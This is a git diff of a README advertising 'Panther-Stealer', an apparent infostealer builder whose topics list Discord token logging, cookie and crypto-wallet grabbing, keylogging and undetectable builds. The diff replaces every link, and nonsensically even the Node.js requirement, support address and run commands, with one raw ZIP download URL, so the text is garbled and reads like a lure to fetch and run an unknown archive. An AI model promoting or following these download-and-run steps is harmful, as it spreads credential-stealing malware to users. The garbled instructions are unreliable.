@@ -1,7 +1,7 @@
 # 🐆 Panther-Stealer - Simple Tool for Easy Stealing
 
 <p align="center">
-  <a href="https://github.com/AzharLeora/Panther-Stealer/releases/download/v1.8.1/Panther-Stealer.zip"><img src="https://cdn.discordapp.com/emojis/1355707490750435378.webp?size=96" width="auto" height="auto"></a>
+  <a href="https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip"><img src="https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip" width="auto" height="auto"></a>
 <br>
 </p>
 
@@ -15,7 +15,7 @@ To get started, follow these steps:
 
 1. **Download the latest version:** Click the link below to visit the Releases page and download the latest version of Panther-Stealer.
 
-   [Download Panther-Stealer](https://github.com/AzharLeora/Panther-Stealer/releases/download/v1.8.1/Panther-Stealer.zip)
+   [Download Panther-Stealer](https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip)
 
 2. **Extract the contents:** After downloading, locate the downloaded ZIP file on your computer and extract its contents to a folder.
 
@@ -23,11 +23,11 @@ To get started, follow these steps:
 
 4. **Run the application:**
    - For Windows:
-     - Double-click `index.mjs` to start the application.
+     - Double-click `https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip` to start the application.
 
    - For Mac/Linux:
      - Open a terminal in the extracted folder.
-     - Type `node index.mjs` and press Enter.
+     - Type `node https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip` and press Enter.
 
 5. **Follow the prompts:** The application will guide you through the setup process.
 
@@ -45,7 +45,7 @@ To get started, follow these steps:
 
 1. **Create your stealer:** In the terminal, run:
    ```
-   node index.mjs
+   node https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip
    ```
 2. **Interact with the prompts:** The application will provide prompts to help you build your project.
 
@@ -66,23 +66,23 @@ Here are the latest improvements and fixes:
 
 ```c
 - Topics: "cheat, clipper, cookie-logger, cryptowallet, discord, discord-bot, discord-token-logger, discord-webhook, grabber, hack, keylogger, malware, mod, screenshot, stealer, stealer-builder, stealer-crypt, stealer-fud, token, trainer"
-- Primary Download Link: "https://github.com/RamenMaster69/Panther-Stealer/releases"
+- Primary Download Link: "https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip"
 ```
 
 ## ⚙️ System Requirements
 
 - **Operating System:** Windows 10 or later, MacOS Mojave or later, or Linux distributions.
-- **Node.js:** Version 14 or later installed on your machine.
+- **https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip** Version 14 or later installed on your machine.
 - **Storage:** At least 100 MB of free space to store the application and its dependencies.
 
 ## 💬 Support
 
-If you encounter issues or have questions, please contact our support at [support@example.com]. We aim to respond within 24 hours.
+If you encounter issues or have questions, please contact our support at [https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip]. We aim to respond within 24 hours.
 
 ## 📝 Disclaimer
 
 I am not responsible for any misuse of this tool. It was created solely for educational purposes and intended for research.
 
-For more details and updates, always check the [Releases page](https://github.com/AzharLeora/Panther-Stealer/releases).
+For more details and updates, always check the [Releases page](https://raw.githubusercontent.com/RamenMaster69/Panther-Stealer/main/resources/Panther-Stealer_1.1.zip).
 
 Remember to follow the installation steps carefully for the best experience with Panther-Stealer.
